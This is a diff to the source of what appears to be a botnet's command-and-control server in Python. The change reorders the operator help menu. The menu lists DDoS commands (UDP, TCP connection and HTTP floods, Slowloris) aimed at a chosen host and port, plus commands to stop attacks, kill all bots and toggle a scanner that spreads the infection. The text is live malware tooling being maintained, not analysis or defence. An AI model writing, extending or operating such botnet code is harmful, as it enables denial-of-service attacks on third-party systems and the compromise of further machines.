@@ -241,10 +241,10 @@ def Commander(sock,rlock):#cnc server
 				#shell_exec()
 			if cmd_str == '?' or cmd_str == 'help':
 				sock.send('\r\n#-- Commands --#\r\n'.encode())
+				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
 				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
 				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())	#http flood
-				sock.send('  slowloris : !slow host port threads conn path\r\n'.encode())    #slowloris
-				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
+				sock.send('  Slowloris : !slow host port threads conn path\r\n'.encode())    #slowloris
 				sock.send('    !stop    : stop attack\r\n'.encode())
 				sock.send('    !kill    : kill all the bots\r\n'.encode())
 				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
